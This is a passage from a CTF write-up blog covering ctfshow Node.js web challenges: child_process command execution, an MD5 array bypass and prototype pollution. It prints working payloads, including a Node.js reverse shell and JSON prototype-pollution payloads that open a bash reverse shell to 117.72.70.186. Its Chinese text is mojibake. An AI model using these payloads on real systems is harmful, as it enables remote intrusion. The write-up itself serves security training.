string">'./fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>Âè¶Â§ñÂØπ‰∫éÁ¨¨‰∏ÄÊ¨°ÁöÑPayloadÂèØ‰ª•ÁªïËøáÊâßË°å</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>Âè¶Â§ñ‰πüÂèØ‰ª•ËøõË°åÂèçÂºπshell</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">1211</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web337-Êï∞ÁªÑÁªïËøáMD5"><a href="#web337-Êï∞ÁªÑÁªïËøáMD5" class="headerlink" title="web337(Êï∞ÁªÑÁªïËøáMD5)"></a>web337(Êï∞ÁªÑÁªïËøáMD5)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p><code>a[x]=1&amp;b[x]=2</code></p><p>Êï∞ÁªÑ‰ºöË¢´Ëß£ÊûêÊàê<code>[object Object]</code></p><p><img src="web337.png" loading="lazy"></p><h4 id="web338-ÂéüÂûãÈìæÊ±°Êüì"><a href="#web338-ÂéüÂûãÈìæÊ±°Êüì" class="headerlink" title="web338(ÂéüÂûãÈìæÊ±°Êüì)"></a>web338(ÂéüÂûãÈìæÊ±°Êüì)</h4><p>Áªô‰∫ÜÊ∫êÁ†Å</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÂ§±Ë¥•'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// common.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">Ê∑±ÂÖ•ÁêÜËß£ JavaScript Prototype Ê±°ÊüìÊîªÂáª</a></p><p>ÁúãÂà∞‰∫ÜcopyÊìç‰ΩúËÄÉËôëÂéüÂûãÈìæÊ±°ÊüìÔºå‰∫éÊòØÂ∞ùËØïÊ±°ÊüìObjectÁ±ªÔºåÊ∑ªÂä†{‚Äúctfshow‚Äù:‚Äú36dboy‚Äù}Â±ûÊÄß</p><pre class="language-json" data-language="json"><code class="language-json">POST<span class="token operator">:</span>Content-Type<span class="token operator">:</span> application/json<span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web339-Ê®°ÂùóÊ∏≤Êüì-ÂèçÂºπshell"><a href="#web339-Ê®°ÂùóÊ∏≤Êüì-ÂèçÂºπshell" class="headerlink" title="web339(Ê®°ÂùóÊ∏≤Êüì ÂèçÂºπshell)"></a>web339(Ê®°ÂùóÊ∏≤Êüì ÂèçÂºπshell)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÂ§±Ë¥•'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>ÂéüÂûãÈìæÊ±°ÊüìË¶ÜÁõñ query ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å</p><p>FunctionÁéØÂ¢É‰∏ãÊ≤°ÊúârequireÂáΩÊï∞Ôºå‰∏çËÉΩËé∑Âæóchild_processÊ®°ÂùóÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰ΩøÁî®process.mainModule.constructor._loadÊù•‰ª£Êõørequire„ÄÇ</p><p>Function(query)(query)ÂèØ‰ª•ÊâßË°åqueryÂØπÂ∫îÁöÑÊåá‰ª§ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂèòÈáèË¶ÜÁõñÔºåÂ∞ÜqueryÁöÑÂÄº‰Ωú‰∏∫ÂèçÂºπshellÁöÑÁÇπ„ÄÇ</p><p>È¢ÑÊúüËß£<br>ÂÖàÊäìÂåÖËÆøÈóÆ&#x2F;loginÔºåÂÆûÁé∞queryÂÄºÁöÑË¶ÜÁõñÔºåÂÜçPOSTËÆøÈóÆ&#x2F;apiÊù•ÊâßË°åqueryÁöÑÂÄº„ÄÇ</p><p>Áî®ÂèçÂºπshellÁöÑÂÄºË¶ÜÁõñÔºö</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web339.png" loading="lazy"></p><h4 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÂ§±Ë¥•'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>ËøôÊ¨°userÂØπË±°Ê±°Êüì‰∫Ü‰∏§Â±ÇÔºåÂèØ‰ª•Â∞èÂ∞èÊµãËØï‰∏Ä‰∏ã</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"__proto__":&#123;"query":true&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">// &#123; ['__proto__']: &#123; ['__proto__']: &#123; query: true &#125; &#125; &#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Object:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><p>ÂΩìÊàë‰ª¨ÂµåÂ•ó‰∏§Â±Ç<code>__proto__</code>Êó∂Ôºå‰∏çÁÆ°ÊòØuserÂØπË±°ËøòÊòØuser.userinfoÂØπË±°ÈÉΩÂ≠òÂú®queryÂ±ûÊÄßÔºåÂπ∂ÊàêÂäüË¢´ËµãÂÄº„ÄÇ</p><p>PayloadÔºö</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token 